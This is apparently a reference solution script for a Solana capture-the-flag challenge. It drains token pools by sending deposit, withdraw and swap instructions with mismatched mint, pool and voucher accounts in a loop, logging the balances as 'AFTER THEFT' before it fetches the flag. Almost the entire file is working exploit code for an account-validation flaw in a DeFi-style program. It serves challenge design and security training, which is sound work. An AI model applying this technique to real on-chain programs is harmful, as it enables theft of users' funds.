import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";

// XXX PLAYER IMPORTS should be deleted to avoid spoiling
import { PublicKey, Keypair, SystemProgram, Transaction } from "@solana/web3.js";
import {
    getAssociatedTokenAddress, TOKEN_PROGRAM_ID,
} from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge2.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeTwo;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
    let conn2 = new anchor.web3.Connection("http://127.0.0.1:8899", "confirmed");

    let woAccount = await getAssociatedTokenAddress(accounts.woEthMint, player.publicKey);
    let woVoucherAccount = await getAssociatedTokenAddress(accounts.woEthVoucherMint, player.publicKey);

    let soAccount = await getAssociatedTokenAddress(accounts.soEthMint, player.publicKey);
    let soVoucherAccount = await getAssociatedTokenAddress(accounts.soEthVoucherMint, player.publicKey);

    let stAccount = await getAssociatedTokenAddress(accounts.stEthMint, player.publicKey);
    let stVoucherAccount = await getAssociatedTokenAddress(accounts.stEthVoucherMint, player.publicKey);

    // XXX this is for me to test, a player cant access the chain like this except running local
    let balances = async function(msg = "") {
        let woBal = await conn2.getTokenAccountBalance(woAccount);
        let soBal = await conn2.getTokenAccountBalance(soAccount);
        let stBal = await conn2.getTokenAccountBalance(stAccount);

        let wo = woBal.value.uiAmount;
        let so = soBal.value.uiAmount;
        let st = stBal.value.uiAmount;

        let woPool = await conn2.getTokenAccountBalance(accounts.woEthPoolAccount);
        let soPool = await conn2.getTokenAccountBalance(accounts.soEthPoolAccount);
        let stPool = await conn2.getTokenAccountBalance(accounts.stEthPoolAccount);

        let woP = woPool.value.uiAmount;
        let soP = soPool.value.uiAmount;
        let stP = stPool.value.uiAmount;

        console.log(`${msg}:\nwo: ${wo} (${woBal.value.amount})\nso: ${so} (${soBal.value.amount})\nst: ${st} (${stBal.value.amount})\n= ${wo + so + st}`);
        console.log(`woP: ${woP} (${woPool.value.amount})\nsoP: ${soP} (${soPool.value.amount})\nstP: ${stP} (${stPool.value.amount})\n= ${woP + soP + stP}\n`);
    }

    await balances("BEFORE");

    let woDepositAccounts = {
        player: player.publicKey,
        depositor: player.publicKey,
        state: accounts.state,
        depositMint: accounts.soEthMint,
        pool: accounts.woEthPool,
        poolAccount: accounts.woEthPoolAccount,
        voucherMint: accounts.soEthVoucherMint,
        depositorAccount: woAccount,
        depositorVoucherAccount: soVoucherAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    let woWithdrawAccounts = {
        player: player.publicKey,
        depositor: player.publicKey,
        state: accounts.state,
        depositMint: accounts.soEthMint,
        pool: accounts.soEthPool,
        poolAccount: accounts.soEthPoolAccount,
        voucherMint: accounts.soEthVoucherMint,
        depositorAccount: soAccount,
        depositorVoucherAccount: soVoucherAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    let woSwapAccounts = {
        player: player.publicKey,
        swapper: player.publicKey,
        state: accounts.state,
        fromPool: accounts.soEthPool,
        toPool: accounts.woEthPool,
        fromPoolAccount: accounts.soEthPoolAccount,
        toPoolAccount: accounts.woEthPoolAccount,
        fromSwapperAccount: soAccount,
        toSwapperAccount: woAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    let stDepositAccounts = {
        player: player.publicKey,
        depositor: player.publicKey,
        state: accounts.state,
        depositMint: accounts.soEthMint,
        pool: accounts.stEthPool,
        poolAccount: accounts.stEthPoolAccount,
        voucherMint: accounts.soEthVoucherMint,
        depositorAccount: stAccount,
        depositorVoucherAccount: soVoucherAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    let stWithdrawAccounts = {
        player: player.publicKey,
        depositor: player.publicKey,
        state: accounts.state,
        depositMint: accounts.soEthMint,
        pool: accounts.soEthPool,
        poolAccount: accounts.soEthPoolAccount,
        voucherMint: accounts.soEthVoucherMint,
        depositorAccount: soAccount,
        depositorVoucherAccount: soVoucherAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    let stSwapAccounts = {
        player: player.publicKey,
        swapper: player.publicKey,
        state: accounts.state,
        fromPool: accounts.soEthPool,
        toPool: accounts.stEthPool,
        fromPoolAccount: accounts.soEthPoolAccount,
        toPoolAccount: accounts.stEthPoolAccount,
        fromSwapperAccount: soAccount,
        toSwapperAccount: stAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
    };

    // the first two build up more wo/st eth than either pool
    // the last three drain whats left
    for (let value of [1000, 100000, 900000, 9000, 100, 1]) {
        let deposit = program.instruction.deposit(new BN(value), { accounts: woDepositAccounts });
        let withdraw = program.instruction.withdraw(new BN(value), { accounts: woWithdrawAccounts });
        let swap = program.instruction.swap(new BN(value), { accounts: woSwapAccounts });
        await conn2.confirmTransaction(await sendInstructions(baseUrl, [deposit, withdraw, swap], [player]));

        deposit = program.instruction.deposit(new BN(value), { accounts: stDepositAccounts });
        withdraw = program.instruction.withdraw(new BN(value), { accounts: stWithdrawAccounts });
        swap = program.instruction.swap(new BN(value), { accounts: stSwapAccounts });
        await conn2.confirmTransaction(await sendInstructions(baseUrl, [deposit, withdraw, swap], [player]));

        await balances("AFTER THEFT");
    }
}

console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 2);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
